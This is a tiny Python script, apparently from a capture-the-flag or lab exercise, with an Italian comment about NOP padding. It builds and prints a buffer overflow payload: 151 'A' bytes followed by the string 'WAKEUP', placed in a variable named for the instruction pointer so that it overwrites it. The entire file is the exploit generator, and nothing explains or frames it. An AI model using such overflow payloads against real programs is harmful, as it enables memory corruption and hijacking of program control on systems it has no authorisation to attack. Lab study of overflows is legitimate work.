MAGIC_N = 151 
# ricorda 128 - 121 = 7 nop
if __name__ == '__main__':
    rip_ = 'WAKEUP'
    inject = (MAGIC_N)  * 'A'  + rip_
    print(inject)
